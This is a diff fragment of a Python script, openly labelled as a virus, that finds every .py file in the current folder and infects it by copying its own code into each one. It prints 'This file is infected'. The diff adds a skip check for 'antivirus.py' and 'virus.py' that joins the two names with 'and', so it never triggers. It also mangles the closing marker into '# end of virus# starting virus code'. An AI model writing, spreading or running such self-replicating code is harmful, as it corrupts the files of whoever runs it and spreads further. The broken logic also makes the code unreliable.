@@ -1,3 +1,4 @@
+
 # starting virus code 
 import sys, re, glob
 
@@ -28,6 +29,8 @@ programs = glob.glob("*.py")
 # check and infect all programs
 
 for p in programs:
+    if p == "antivirus.py" and p == "virus.py" :
+        continue
     file = open(p, "r")
     programcode = file.readlines()
     file.close()
@@ -53,4 +56,4 @@ for p in programs:
         
 print("This file is infected") 
 
-# end of virus
+# end of virus# starting virus code 
